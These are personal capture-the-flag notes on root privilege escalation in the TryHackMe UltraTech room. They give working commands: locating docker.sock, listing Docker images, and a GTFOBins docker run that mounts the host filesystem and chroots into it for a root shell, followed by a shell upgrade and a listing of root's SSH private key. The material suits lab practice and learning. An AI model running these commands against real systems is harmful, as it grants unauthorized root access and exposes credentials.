#Linux #PrivEsc #docker 

# CTF Challenge

[[UltraTech - THM]]

---

- `find / -name docker.sock 2>/dev/null`
	- we find `/run/docker.sock`
- identify images
```
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB
```
- Having explored HackTricks, I use GTFOBins and find an exploit that gives me a root `/bin/bash`
```
r00t@ultratech-prod:/$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

- Improve shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- Found #ssh keys in root folder
```
root@349266c76c7f:~/.ssh# ll
total 16
drwx------ 2 root root 4096 Mar 22  2019 ./
drwx------ 6 root root 4096 Mar 22  2019 ../
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
```